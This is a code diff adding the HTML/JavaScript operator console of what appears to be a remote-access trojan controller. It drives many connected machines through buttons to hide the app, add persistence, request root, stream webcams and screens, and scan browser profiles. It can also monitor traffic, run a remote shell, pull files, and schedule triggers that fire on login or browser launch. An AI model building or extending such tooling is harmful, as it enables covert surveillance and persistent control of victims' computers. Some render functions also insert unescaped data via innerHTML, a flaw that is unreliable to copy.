+                    <input type="file" id="cert-file-input">
+                </div>
+                <button class="btn-warning w-full" onclick="handleCertUpload()">Install Cert</button>
+            </div>
+            <!-- Hardware: Fans -->
+            <div class="card">
+                <h3>🌀 Fans</h3>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_list_fans()">List Fans</button>
+                <div class="form-group"><label>Fan ID</label><input type="text" id="fan-id" value="gpu_0"></div>
+                <div class="form-group"><label>Speed</label><input type="range" min="0" max="100" id="fan-speed" oninput="document.getElementById('fan-speed-val').innerText=this.value"><span id="fan-speed-val" style="float:right; font-size: 11px;">50%</span></div>
+                <button class="btn-info w-full" onclick="api.cmd_set_fan_speed(document.getElementById('fan-id').value, document.getElementById('fan-speed').value)">Set Speed</button>
+                <div class="flex-row">
+                    <button class="btn-danger w-full safe-action" onclick="api.cmd_fans_all_off()">All Off</button>
+                    <button class="btn-success w-full safe-action" onclick="api.cmd_fans_all_on()">All On</button>
+                </div>
+            </div>
+            <!-- Security: Delete Prevention -->
+            <div class="card">
+                <h3>🛡 Delete Prevention</h3>
+                <p style="font-size: 11px; color: var(--text-muted); margin: 0;">Monitors file deletions and process termination.</p>
+                <div class="flex-row" style="margin-top: 10px;">
+                    <button class="btn-success w-full safe-action" onclick="api.cmd_start_delete_prevention()">▶ Start</button>
+                    <button class="btn-danger w-full safe-action" onclick="api.cmd_stop_delete_prevention()">■ Stop</button>
+                </div>
+            </div>
+            <!-- Power Control -->
+            <div class="card">
+                <h3>⚡ Power Control</h3>
+                
+                <div class="form-group">
+                    <label>Delay (seconds)</label>
+                    <input type="number" id="power-delay" value="0" min="0" max="3600" placeholder="0 = immediate">
+                </div>
+                
+                <button class="w-full" style="background:#e74c3c" 
+                        onclick="confirmCriticalAction('Reboot System', 'Are you sure you want to reboot the remote system?', 'api.cmd_reboot', document.getElementById('power-delay').value)">
+                    🔄 Reboot System
+                </button>
+                
+                <button class="w-full" style="background:#c0392b; margin-top:10px" 
+                        onclick="confirmCriticalAction('Shutdown System', 'Are you sure you want to shutdown the remote system?', 'api.cmd_shutdown', document.getElementById('power-delay').value)">
+                    🔌 Shutdown System
+                </button>
+                
+                <button class="w-full" style="background:#27ae60; margin-top:10px" 
+                        onclick="api.cmd_cancel_shutdown()">
+                    ⛔ Cancel Shutdown
+                </button>
+            </div>
+            <!-- Hardware: LEDs -->
+            <div class="card">
+                <h3>💡 LEDs</h3>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_list_leds()">List LEDs</button>
+                <div class="form-group"><label>LED ID</label><input type="text" id="led-id" value="caps_lock"></div>
+                <div class="flex-row">
+                    <button class="btn-warning w-full safe-action" onclick="api.cmd_leds_all_on()">All ON</button>
+                    <button class="btn-danger w-full safe-action" onclick="api.cmd_leds_all_off()">All OFF</button>
+                </div>
+            </div>
+            <!-- Hardware: Screens -->
+            <div class="card">
+                <h3>🖥 Screens</h3>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_list_screens()">List Screens</button>
+                <div class="form-group"><label>Screen ID</label><input type="text" id="screen-id" value="screen_0"></div>
+                <div class="flex-row">
+                    <button class="btn-success w-full safe-action" onclick="api.cmd_screens_all_on()">All ON</button>
+                    <button class="btn-danger w-full safe-action" onclick="api.cmd_screens_all_off()">All OFF</button>
+                </div>
+            </div>
+            <!-- Devices -->
+            <div class="card">
+                <h3>🔌 Devices</h3>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_list_all_devices()">↻ Refresh Devices</button>
+                <span id="dev-count" style="font-size: 11px; color: var(--text-muted);">Devices: 0</span>
+                <div id="device-list-container" style="display: flex; flex-direction: column; gap: 6px; margin-top: 6px;"></div>
+            </div>
+            <!-- Security: Hide -->
+            <div class="card">
+                <h3>👻 Security</h3>
+                <p style="font-size: 11px; color: var(--text-muted); margin: 0;">Hide app or add persistence.</p>
+                <button class="btn-warning w-full safe-action" onclick="api.cmd_hide_app()">Hide Application</button>
+                <button class="btn-warning w-full safe-action" onclick="api.cmd_add_persistence()">Add Persistence</button>
+                <button class="btn-warning w-full" onclick="checkAdminForAdvancedPersist()">Advanced Persist</button>
+            </div>
+            <!-- Security: Sessions -->
+            <div class="card">
+                <h3>👥 User Sessions</h3>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_list_sessions()">List Sessions</button>
+                <button class="btn-warning w-full safe-action" onclick="api.cmd_launch_admin_instances()">Launch Admin</button>
+            </div>
+            <!-- Security Status -->
+            <div class="card">
+                <h3>📊 Security Status</h3>
+                <div class="card-row"><span>Visibility:</span> <span id="sec-visibility" class="text-info">Visible</span></div>
+                <div class="card-row"><span>Persistence:</span> <span id="sec-persist" class="text-error">Not Installed</span></div>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_check_security_status()">Check Status</button>
+            </div>
+            <!-- Browser Profiles -->
+            <div class="card" style="grid-column: span 2;">
+                <h3>🌐 Browser Profiles</h3>
+                <!-- Container with Loading Support -->
+                <div id="browser-profiles-container" class="container-with-loading" style="display: none; margin-top: 8px; position: relative; min-height: 100px;">
+                    <div class="loading-overlay">
+                        <div class="spinner-sm"></div>
+                        <div style="color: var(--primary); font-size: 12px; margin-top: 10px;">Scanning Profiles...</div>
+                    </div>
+                    <table id="browser-table" style="width: 100%; border-collapse: collapse;">
+                        <thead>
+                            <tr>
+                                <th>Browser</th>
+                                <th>Profile</th>
+                                <th>Size</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="browser-list-body"></tbody>
+                    </table>
+                </div>
+                <div id="browser-placeholder" style="padding: 20px; text-align: center; color: var(--text-muted); font-size: 12px;">
+                    Click "Scan" to detect browser profiles.
+                </div>
+                <button id="btn-scan-browsers" class="btn-primary safe-action" onclick="scanBrowserProfiles()">↻ Scan Profiles</button>
+            </div>
+            <!-- Network Monitor -->
+            <div class="card" style="grid-column: span 2;">
+                <h3>📊 Network Traffic</h3>
+                <div class="flex-row" style="margin-bottom: 8px;">
+                    <button class="btn-success safe-action" onclick="api.start_network_monitor()">▶ Start</button>
+                    <button class="btn-danger safe-action" onclick="api.stop_network_monitor()">■ Stop</button>
+                    <span style="margin-left: auto; display: flex; gap: 12px; font-size: 11px;">
+                        <span class="text-info">HTTP: <span id="net-http">0</span></span>
+                        <span class="text-success">HTTPS: <span id="net-https">0</span></span>
+                        <span class="text-warning">DNS: <span id="net-dns">0</span></span>
+                    </span>
+                </div>
+                <div id="network-log" class="log-container" style="min-height: 120px; margin: 0;"></div>
+            </div>
+        </div>
+    </div>
+    <!-- ============ TAB: USB MONITOR ============ -->
+    <div id="tab-usb" class="tab-content">
+        <div style="padding: 10px 14px; display: flex; justify-content: space-between; align-items: center; background: var(--bg-panel); border-bottom: 1px solid var(--border);">
+            <span id="usb-status-text" style="font-size: 12px;">⏳ Waiting for USB events...</span>
+            <button onclick="document.getElementById('usb-log').innerHTML = ''">✕ Clear</button>
+        </div>
+        <div id="usb-log" class="log-container" style="margin: 0; border-radius: 0; border: none;"></div>
+    </div>
+    <!-- ============ TAB: SCHEDULER ============ -->
+    <div id="tab-scheduler" class="tab-content">
+        <div style="padding: 10px 14px; display: flex; gap: 10px; border-bottom: 1px solid var(--border); background: var(--bg-panel);">
+            <button class="btn-info safe-action" onclick="refreshScheduler()">↻ Refresh</button>
+            <button class="btn-success" onclick="openModal('modal-add-task')">+ Add Task</button>
+        </div>
+        <!-- Container with Loading Support -->
+        <div id="task-list-container" class="grid-container container-with-loading" style="position: relative; min-height: 200px;">
+            <div class="loading-overlay">
+                <div class="spinner-sm"></div>
+                <div style="color: var(--primary); font-size: 12px; margin-top: 10px;">Loading Tasks...</div>
+            </div>
+            <!-- Tasks will be injected here -->
+        </div>
+    </div>
+    <!-- ============ TAB: TRIGGERS ============ -->
+    <div id="tab-triggers" class="tab-content">
+        <div style="padding: 10px 14px; display: flex; gap: 10px; border-bottom: 1px solid var(--border); background: var(--bg-panel);">
+            <button class="btn-info safe-action" onclick="refreshTriggers()">↻ Refresh</button>
+            <button class="btn-success" onclick="openModal('modal-add-trigger')">+ Add Trigger</button>
+        </div>
+        <!-- Container with Loading Support -->
+        <div id="trigger-list-container" class="grid-container container-with-loading" style="position: relative; min-height: 200px;">
+            <div class="loading-overlay">
+                <div class="spinner-sm"></div>
+                <div style="color: var(--primary); font-size: 12px; margin-top: 10px;">Loading Triggers...</div>
+            </div>
+            <!-- Triggers will be injected here -->
+        </div>
+    </div>
+    
+    <!-- === MODALS === -->
+    
+    <!-- Critical Action Confirmation Modal -->
+    <div id="modal-confirm-critical" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 id="critical-title" style="color: var(--danger);">Confirm Action</h2>
+                <button class="close-btn" onclick="closeModal('modal-confirm-critical')">&times;</button>
+            </div>
+            <div class="modal-body-text" id="critical-message"></div>
+            <div class="modal-footer">
+                <button onclick="closeModal('modal-confirm-critical')">Cancel</button>
+                <button id="critical-confirm-btn" class="btn-danger">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Add Task Modal -->
+    <div id="modal-add-task" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>Add Scheduled Task</h2>
+                <button class="close-btn" onclick="closeModal('modal-add-task')">&times;</button>
+            </div>
+            <div class="form-group"><label>Task Name</label><input type="text" id="task-name"></div>
+            <div class="form-group"><label>Executable</label>
+                <select id="task-exe-type" onchange="document.getElementById('task-exe-path-container').classList.toggle('d-none', this.value === 'self')"><option value="self">Self</option><option value="external">External</option></select>
+                <div id="task-exe-path-container" class="d-none" style="margin-top:5px"><input type="text" id="task-exe-path" value="C:\path\to\app.exe"></div>
+            </div>
+            <div class="form-group"><label>Delay</label>
+                <div class="flex-row">
+                    <input type="number" id="task-delay" value="10" style="width: 80px">
+                    <select id="task-unit"><option value="s">Seconds</option><option value="m">Minutes</option><option value="h">Hours</option></select>
+                </div>
+            </div>
+            <div class="form-group"><label>Run As</label>
+                <select id="task-priv"><option value="user">User</option><option value="admin">Admin</option></select>
+            </div>
+            <button class="btn-success w-full" onclick="submitTask()">Schedule</button>
+        </div>
+    </div>
+    
+    <!-- Add Trigger Modal -->
+    <div id="modal-add-trigger" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>Add Event Trigger</h2>
+                <button class="close-btn" onclick="closeModal('modal-add-trigger')">&times;</button>
+            </div>
+            <div class="form-group"><label>Trigger Event</label>
+                <select id="trig-type">
+                    <option value="login">User Login</option>
+                    <option value="cmd">CMD Launch</option>
+                    <option value="browser">Browser Launch</option>
+                    <option value="file_open">File Access</option>
+                </select>
+            </div>
+            <div class="form-group"><label>Action</label>
+                <select id="trig-action-type" onchange="document.getElementById('trig-exe-path-container').classList.toggle('d-none', this.value === 'self')"><option value="self">Trigger Self</option><option value="external">External App</option></select>
+                <div id="trig-exe-path-container" class="d-none" style="margin-top:5px"><input type="text" id="trig-exe-path" value="C:\path\to\app.exe"></div>
+            </div>
+            <div class="form-group" id="trig-path-group"><label>Watch Path (for file_open)</label><input type="text" id="trig-path" value="C:\folder"></div>
+            <button class="btn-success w-full" onclick="submitTrigger()">Add Trigger</button>
+        </div>
+    </div>
+    
+    <!-- Context Menu -->
+    <div id="context-menu">
+        <div class="ctx-item" onclick="ctxAction('download')">📥 Download</div>
+        <div class="ctx-item" onclick="ctxAction('preview')">👁 Preview</div>
+        <div class="ctx-item" onclick="ctxAction('rename')">✏ Rename</div>
+        <div class="ctx-item" onclick="ctxAction('copy')">📋 Copy Path</div>
+        <div class="ctx-divider"></div>
+        <div class="ctx-item" onclick="ctxAction('delete')" style="color: var(--danger);">🗑 Delete</div>
+    </div>
+    <script>
+        // === GLOBAL STATE ===
+        let apiReady = false;
+        let currentPath = '/';
+        let selectedFile = null;
+        let commandHistory = [];
+        let historyIndex = -1;
+        let pendingCriticalCallback = null; // Stores function for critical modal
+        let previousClientSelection = null; // To revert selection on cancel
+        
+        // === API INITIALIZATION ===
+        const checkApi = setInterval(() => {
+            if (window.pywebview && window.pywebview.api) {
+                clearInterval(checkApi);
+                apiReady = true;
+                window.api = window.pywebview.api;
+                console.log("✅ API Connected");
+                initApp();
+            }
+        }, 100);
+        
+        // === LOCAL LOADING HELPERS ===
+        function setLoadingState(elementId, isLoading) {
+            const el = document.getElementById(elementId);
+            if (el) {
+                if (isLoading) el.classList.add('loading');
+                else el.classList.remove('loading');
+            }
+        }
+
+        // === STREAMING LOGIC ===
+        function startStreamAction(type) {
+            const container = document.getElementById('stream-view-container');
+            container.classList.add('loading'); // Show spinner
+            
+            if (type === 'webcam') api.start_webcam_stream();
+            if (type === 'screen') api.start_screen_stream();
+        }
+
+        // === SCHEDULER LOGIC ===
+        function refreshScheduler() {
+            const container = document.getElementById('task-list-container');
+            container.classList.add('loading'); // Show spinner
+            // Clear previous tasks
+            const existingTasks = container.querySelectorAll('.card');
+            existingTasks.forEach(e => e.remove());
+            
+            api.cmd_list_scheduled_tasks();
+        }
+
+        // === TRIGGERS LOGIC ===
+        function refreshTriggers() {
+            const container = document.getElementById('trigger-list-container');
+            container.classList.add('loading'); // Show spinner
+            // Clear previous triggers
+            const existingTriggers = container.querySelectorAll('.card');
+            existingTriggers.forEach(e => e.remove());
+            
+            api.cmd_list_triggers();
+        }
+
+        // === BROWSER LOGIC ===
+        function scanBrowserProfiles() {
+            const container = document.getElementById('browser-profiles-container');
+            const placeholder = document.getElementById('browser-placeholder');
+            const tableBody = document.getElementById('browser-list-body');
+            
+            container.style.display = 'block';
+            placeholder.style.display = 'none';
+            tableBody.innerHTML = ''; // Clear previous
+            container.classList.add('loading'); // Show spinner
+
+            api.cmd_get_browser_profiles();
+        }
+
+        // === CRITICAL ACTION CONFIRMATION LOGIC ===
+        function confirmCriticalAction(title, message, apiPath, ...args) {
+            const modal = document.getElementById('modal-confirm-critical');
+            const titleEl = document.getElementById('critical-title');
+            const msgEl = document.getElementById('critical-message');
+            const confirmBtn = document.getElementById('critical-confirm-btn');
+            
+            titleEl.textContent = title;
+            msgEl.textContent = message;
+            
+            // Store the actual function call to execute on confirm
+            // apiPath is a string like "api.cmd_reboot"
+            pendingCriticalCallback = () => {
+                const parts = apiPath.split('.');
+                const func = window[parts[0]][parts[1]];
+                if (typeof func === 'function') {
+                    func.apply(null, args);
+                }
+            };
+            
+            confirmBtn.onclick = () => {
+                if (pendingCriticalCallback) pendingCriticalCallback();
+                closeModal('modal-confirm-critical');
+            };
+            
+            openModal('modal-confirm-critical');
+        }
+
+        // === ADMIN CHECK FOR ADVANCED PERSISTENCE ===
+        function checkAdminForAdvancedPersist() {
+            const sel = document.getElementById('client-selector');
+            const selectedVal = sel ? sel.value : "ALL_CLIENTS";
+            
+            // Check if the selected option text contains the crown emoji 👑 (Admin indicator from your code)
+            const selectedOption = sel.options[sel.selectedIndex];
+            const isAdmin = selectedOption && selectedOption.text.includes('👑');
+            
+            if (isAdmin) {
+                // User is admin, proceed
+                if (api && api.cmd_install_persistence) {
+                    api.cmd_install_persistence();
+                }
+            } else {
+                // Show warning modal
+                const modalHtml = `
+                    <div class="modal-overlay" id="modal-admin-warning" style="display:flex; z-index:10000;">
+                        <div class="modal">
+                            <div class="modal-header">
+                                <h2 style="color: var(--warning)">⚠️ Privilege Required</h2>
+                                <button class="close-btn" onclick="this.closest('.modal-overlay').remove()">&times;</button>
+                            </div>
+                            <div class="modal-body-text">
+                                <p><strong>Advanced Persistence requires Administrator privileges.</strong></p>
+                                <p style="margin-top:10px;">Please launch an Admin instance from the "User Sessions" card first, then select it from the dropdown menu.</p>
+                            </div>
+                            <div class="modal-footer">
+                                <button onclick="this.closest('.modal-overlay').remove()">Close</button>
+                                <button class="btn-warning" onclick="document.querySelector('#modal-admin-warning').remove(); api.cmd_request_root();">Request Root</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                document.body.insertAdjacentHTML('beforeend', modalHtml);
+            }
+        }
+
+        function initApp() {
+            const cmdInput = document.getElementById('cmd-input');
+            cmdInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    executeCommand();
+                } else if (e.key === 'ArrowUp') {
+                    e.preventDefault();
+                    navHistory(-1);
+                } else if (e.key === 'ArrowDown') {
+                    e.preventDefault();
+                    navHistory(1);
+                }
+            });
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('#context-menu')) {
+                    document.getElementById('context-menu').style.display = 'none';
+                }
+            });
+        }
+        
+        // === BRIDGE FUNCTIONS ===
+        
+        // Called by Python to notify that an async operation is finished
+        // If needed specifically for global tasks, but local loading handles specific UI parts
+        window.notify_api_completion = function() {
+            // Handled by specific render functions removing loading classes
+        }
+
+        function appendShellOutput(text, tag) {
+            const out = document.getElementById('shell-output');
+            const div = document.createElement('div');
+            div.textContent = text;
+            
+            if (tag === 'command') div.style.color = '#00e5ff';
+            else if (tag === 'error') div.style.color = '#ff1744';
+            else if (tag === 'success') div.style.color = '#00e676';
+            else if (tag === 'info') div.style.color = '#ffab00';
+            else div.style.color = '#00e5ff';
+            out.appendChild(div);
+            out.scrollTop = out.scrollHeight;
+        }
+        function clearShell() { document.getElementById('shell-output').innerHTML = ''; }
+        function updatePWD(pwd) {
+            currentPath = pwd;
+            const displayPwd = pwd.length > 30 ? '...' + pwd.slice(-27) : pwd;
+            document.getElementById('pwd-label').textContent = `[${displayPwd}]>`;
+        }
+        function setServerStatus(running) {
+            const dot = document.getElementById('status-dot');
+            const text = document.getElementById('status-text');
+            const startBtn = document.getElementById('start-btn');
+            const stopBtn = document.getElementById('stop-btn');
+            const cancelBtn = document.getElementById('cancel-btn');
+            if (running) {
+                dot.className = 'status-dot active';
+                text.textContent = 'Server Running';
+                startBtn.disabled = true;
+                stopBtn.disabled = false;
+                cancelBtn.disabled = false;
+                enableControls(true);
+            } else {
+                dot.className = 'status-dot error';
+                text.textContent = 'Server Stopped';
+                startBtn.disabled = false;
+                stopBtn.disabled = true;
+                cancelBtn.disabled = true;
+                enableControls(false);
+            }
+        }
+        function updateClientDropdown(options) {
+            const sel = document.getElementById('client-selector');
+            sel.innerHTML = '<option value="ALL_CLIENTS">ALL CLIENTS</option>'; // Reset
+            
+            let clientCount = 0;
+            let instanceCount = 0;
+            let firstInstanceIndex = -1;
+
+            options.forEach((opt, idx) => {
+                // We use idx+1 because index 0 is ALL_CLIENTS
+                const realIndex = idx + 1; 
+
+                if (opt.type === 'global') {
+                    const option = document.createElement('option');
+                    option.value = opt.value;
+                    option.textContent = opt.display;
+                    option.style.fontWeight = 'bold';
+                    option.style.backgroundColor = 'var(--bg-panel)';
+                    sel.appendChild(option);
+                } 
+                else if (opt.type === 'device_header') {
+                    const option = document.createElement('option');
+                    option.value = opt.value;
+                    option.textContent = opt.display;
+                    option.style.fontWeight = 'bold';
+                    option.style.color = 'var(--primary)';
+                    option.style.backgroundColor = 'rgba(0, 229, 255, 0.05)';
+                    option.disabled = true;
+                    sel.appendChild(option);
+                    clientCount++;
+                }
+                else if (opt.type === 'instance') {
+                    const option = document.createElement('option');
+                    option.value = opt.value;
+                    option.textContent = opt.display;
+                    option.style.paddingLeft = '20px';
+                    option.style.fontFamily = 'monospace';
+                    if (opt.display.includes('👑')) {
+                        option.style.color = 'var(--warning)';
+                    }
+                    sel.appendChild(option);
+                    instanceCount++;
+                    
+                    if (firstInstanceIndex === -1) {
+                        firstInstanceIndex = realIndex;
+                    }
+                }
+            });
+            document.getElementById('client-count').textContent = clientCount;
+
+            // Auto-select logic
+            if (firstInstanceIndex !== -1) {
+                sel.selectedIndex = firstInstanceIndex;
+                previousClientSelection = sel.value;
+                // Trigger the API call for the first client
+                if (window.api && window.api.on_client_selected) {
+                    window.api.on_client_selected(sel.value);
+                }
+            } else {
+                // If no instances, default to ALL (index 0)
+                sel.selectedIndex = 0;
+                previousClientSelection = "ALL_CLIENTS";
+            }
+
+            // Add Change Listener if not exists
+            if (!sel.hasChangeHandler) {
+                sel.addEventListener('change', function(e) {
+                    const selectedValue = e.target.value;
+                    
+                    if (selectedValue === 'ALL_CLIENTS') {
+                        // FIX: Immediately revert the visual selection to the previous valid client
+                        // So the user sees the old selection while the modal is open.
+                        for(let i=0; i<sel.options.length; i++) {
+                            if(sel.options[i].value === previousClientSelection) {
+                                sel.selectedIndex = i;
+                                break;
+                            }
+                        }
+
+                        // Ask for confirmation
+                        confirmCriticalAction(
+                            'Broadcast Command', 
+                            'Are you sure you want to select ALL CLIENTS? This will send commands to every connected device.', 
+                            'confirmClientSelection', 
+                            'ALL_CLIENTS'
+                        );
+                    } else {
+                        // Normal selection
+                        previousClientSelection = selectedValue;
+                        if (window.api && window.api.on_client_selected) {
+                            window.api.on_client_selected(selectedValue);
+                        }
+                    }
+                });
+                sel.hasChangeHandler = true;
+            }
+        }
+        
+        // Helper to confirm ALL_CLIENTS selection
+        window.confirmClientSelection = function(val) {
+            // If confirmed, NOW we update the visual state to ALL_CLIENTS
+            const sel = document.getElementById('client-selector');
+            sel.value = 'ALL_CLIENTS';
+            previousClientSelection = val;
+            
+            if (window.api && window.api.on_client_selected) {
+                window.api.on_client_selected(val);
+            }
+        };
+
+        function updateNavStatus(data) {
+            const batEl = document.getElementById('battery-text');
+            const batPct = data.battery_percent || 0;
+            const batCharging = data.battery_charging;
+            let batColor = 'var(--success)';
+            if (batPct < 50) batColor = 'var(--warning)';
+            if (batPct < 20) batColor = 'var(--danger)';
+            const batIcon = batCharging ? '⚡' : '🔋';
+            batEl.innerHTML = `<span style="color:${batColor}">${batIcon} ${batPct}%</span>`;
+            const netEl = document.getElementById('network-text');
+            const netType = data.network_type || 'Unknown';
+            const wifiStr = data.wifi_strength ? `(${data.wifi_strength}%)` : '';
+            netEl.innerHTML = `<span style="color: ${netType === 'WiFi' ? 'var(--info)' : 'var(--text-muted)'}">${netType} ${wifiStr}</span>`;
+            document.getElementById('time-text').textContent = data.system_time || 'N/A';
+        }
+        function renderFileTree(items) {
+            const tbody = document.getElementById('file-list-body');
+            tbody.innerHTML = '';
+            items.forEach(item => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${item.name}</td>
+                    <td>${item.type}</td>
+                    <td>${item.size}</td>
+                    <td>${item.modified}</td>
+                `;
+                tr.onclick = (e) => {
+                    if (e.target.tagName === 'BUTTON') return;
+                    if (item.raw_type === 'directory') {
+                        api.list_directory(item.path);
+                    } else {
+                        selectedFile = item;
+                        previewFile(item);
+                    }
+                };
+                tr.oncontextmenu = (e) => {
+                    e.preventDefault();
+                    selectedFile = item;
+                    showContextMenu(e.clientX, e.clientY);
+                };
+                tbody.appendChild(tr);
+            });
+        }
+        function renderStorageDevices(devices) {
+            const container = document.getElementById('storage-container');
+            if (!container) return;
+            container.innerHTML = '';
+            if (!devices || devices.length === 0) {
+                container.innerHTML = '<div style="padding: 10px; color: var(--text-muted); font-size: 12px;">No storage devices detected</div>';
+                return;
+            }
+            devices.forEach(dev => {
+                let color = 'var(--success)';
+                if (dev.percent > 90) color = 'var(--danger)';
+                else if (dev.percent > 75) color = 'var(--warning)';
+                const card = document.createElement('div');
+                card.className = 'storage-card';
+                card.setAttribute('data-path', dev.path);
+                card.innerHTML = `
+                    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 6px;">
+                        <span style="font-size: 18px;">${dev.icon}</span>
+                        <div style="flex: 1; overflow: hidden;">
+                            <div style="font-weight: bold; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="${dev.label}">${escapeHtml(dev.label)}</div>
+                            <div style="font-size: 10px; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="${dev.path}">${escapeHtml(dev.path)}</div>
+                        </div>
+                    </div>
+                    <div style="margin: 6px 0;">
+                        <div class="progress-bar">
+                            <div class="progress-fill" style="width: ${dev.percent}%; background: ${color};"></div>
+                        </div>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; font-size: 10px;">
+                        <span>${dev.used_gb}GB / ${dev.total_gb}GB</span>
+                        <span style="color: ${color};">${dev.percent}%</span>
+                    </div>
+                    <div style="font-size: 9px; color: var(--text-muted); margin-top: 3px;">Free: ${dev.free_gb}GB</div>
+                `;
+                card.addEventListener('click', () => {
+                    if (window.api && window.api.list_directory) window.api.list_directory(dev.path);
+                });
+                card.addEventListener('mouseenter', () => { card.style.borderColor = 'var(--primary)'; card.style.cursor = 'pointer'; });
+                card.addEventListener('mouseleave', () => { card.style.borderColor = 'var(--border)'; });
+                container.appendChild(card);
+            });
+            setTimeout(() => {
+                if (window.api && window.api.get_storage_devices) window.api.get_storage_devices();
+            }, 10000);
+        }
+        function renderDevices(groups) {
+            const container = document.getElementById('device-list-container');
+            container.innerHTML = '';
+            let totalCount = 0;
+            groups.forEach(g => {
+                const section = document.createElement('div');
+                section.style.fontSize = '11px';
+                section.style.color = 'var(--primary)';
+                section.style.fontWeight = '600';
+                section.style.marginTop = '6px';
+                section.textContent = g.type;
+                container.appendChild(section);
+                g.devices.forEach(d => {
+                    totalCount++;
+                    const item = document.createElement('div');
+                    item.style.borderBottom = '1px solid var(--border)';
+                    item.style.paddingBottom = '4px';
+                    item.style.marginBottom = '4px';
+                    item.style.fontSize = '11px';
+                    item.innerHTML = `
+                        <div style="display:flex; justify-content:space-between; font-weight:600;">
+                            <span>${d.name}</span>
+                            <span style="color:var(--text-muted)">${d.status}</span>
+                        </div>
+                        <div style="color:var(--text-muted); font-size:10px;">ID: ${d.id} | Caps: ${d.caps}</div>
+                        ${d.removable ? `<button class="btn-warning" style="margin-top:3px; font-size:10px; padding:2px 6px;" onclick="api.device_unmount('${d.id}')">Unmount</button>` : ''}
+                    `;
+                    container.appendChild(item);
+                });
+            });
+            document.getElementById('dev-count').textContent = `Devices: ${totalCount}`;
+        }
+        function renderScheduledTasks(tasks) {
+            const container = document.getElementById('task-list-container');
+            // Remove old cards but keep the loading overlay
+            const oldCards = container.querySelectorAll('.card');
+            oldCards.forEach(c => c.remove());
+            
+            // Hide loading spinner
+            container.classList.remove('loading');
+
+            if (!tasks || tasks.length === 0) {
+                const msg = document.createElement('div');
+                msg.style.gridColumn = '1 / -1';
+                msg.style.textAlign = 'center';
+                msg.style.color = 'var(--text-muted)';
+                msg.style.padding = '20px';
+                msg.textContent = 'No scheduled tasks found.';
+                container.appendChild(msg);
+                return;
+            }
+
+            tasks.forEach(t => {
+                const card = document.createElement('div');
+                card.className = 'card';
+                const privColor = t.privilege === 'admin' ? 'var(--danger)' : 'var(--success)';
+                card.innerHTML = `
+                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                        <h3 style="margin:0; font-size:14px;">${t.name}</h3>
+                        <button class="btn-danger" style="padding:3px 8px; font-size:10px;" onclick="api.cmd_delete_scheduled_task('${t.name}')">Delete</button>
+                    </div>
+                    <div style="font-size:11px; margin-top:5px; color:var(--text-muted);">Next: <span style="color:var(--text-main)">${t.next_run || 'N/A'}</span></div>
+                    <div style="font-size:11px; color:${privColor};">${t.privilege.toUpperCase()}</div>
+                `;
+                container.appendChild(card);
+            });
+        }
+        function renderTriggers(triggers) {
+            const container = document.getElementById('trigger-list-container');
+            // Remove old cards
+            const oldCards = container.querySelectorAll('.card');
+            oldCards.forEach(c => c.remove());
+            
+            // Hide loading spinner
+            container.classList.remove('loading');
+
+            if (!triggers || triggers.length === 0) {
+                const msg = document.createElement('div');
+                msg.style.gridColumn = '1 / -1';
+                msg.style.textAlign = 'center';
+                msg.style.color = 'var(--text-muted)';
+                msg.style.padding = '20px';
+                msg.textContent = 'No triggers found.';
+                container.appendChild(msg);
+                return;
+            }
+
+            triggers.forEach(t => {
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.innerHTML = `
+                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                        <h3 style="margin:0; font-size:14px;">${t.trigger_name || 'Trigger'}</h3>
+                        <button class="btn-danger" style="padding:3px 8px; font-size:10px;" onclick="api.cmd_delete_trigger('${t.id}')">Delete</button>
+                    </div>
+                    <div style="font-size:11px; margin-top:5px; color:var(--text-muted);">Event: <span class="text-info">${t.action}</span></div>
+                `;
+                container.appendChild(card);
+            });
+        }
+        function renderSettings(grouped) {
+            const container = document.getElementById('settings-container');
+            container.innerHTML = '';
+            for (const [type, settings] of Object.entries(grouped)) {
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.innerHTML = `<h3>${type}</h3>`;
+                settings.forEach(s => {
+                    const row = document.createElement('div');
+                    row.style.marginBottom = '10px';
+                    row.style.borderBottom = '1px solid rgba(0, 229, 255, 0.04)';
+                    row.style.paddingBottom = '8px';
+                    const label = document.createElement('div');
+                    label.style.fontSize = '11px';
+                    label.style.color = 'var(--text-muted)';
+                    label.style.marginBottom = '4px';
+                    label.textContent = s.name;
+                    row.appendChild(label);
+                    if (s.type === 'toggle') {
+                        const chk = document.createElement('input');
+                        chk.type = 'checkbox';
+                        chk.checked = s.value === 'on' || s.value === 'true';
+                        chk.onchange = () => api.update_setting(s.name, chk.checked);
+                        row.appendChild(chk);
+                    } else if (s.type === 'slider') {
+                        const rng = document.createElement('input');
+                        rng.type = 'range';
+                        rng.min = s.min; rng.max = s.max;
+                        rng.value = s.value;
+                        rng.style.width = '80%';
+                        const btn = document.createElement('button');
+                        btn.textContent = 'Set';
+                        btn.style.marginLeft = '10px';
+                        btn.onclick = () => api.update_setting(s.name, rng.value);
+                        row.appendChild(rng);
+                        row.appendChild(btn);
+                    } else if (s.type === 'dropdown') {
+                        const sel = document.createElement('select');
+                        const opts = s.options ? s.options.split(',') : [];
+                        opts.forEach(o => {
+                            const opt = document.createElement('option');
+                            opt.value = o; opt.textContent = o;
+                            if(o === s.value) opt.selected = true;
+                            sel.appendChild(opt);
+                        });
+                        sel.onchange = () => api.update_setting(s.name, sel.value);
+                        row.appendChild(sel);
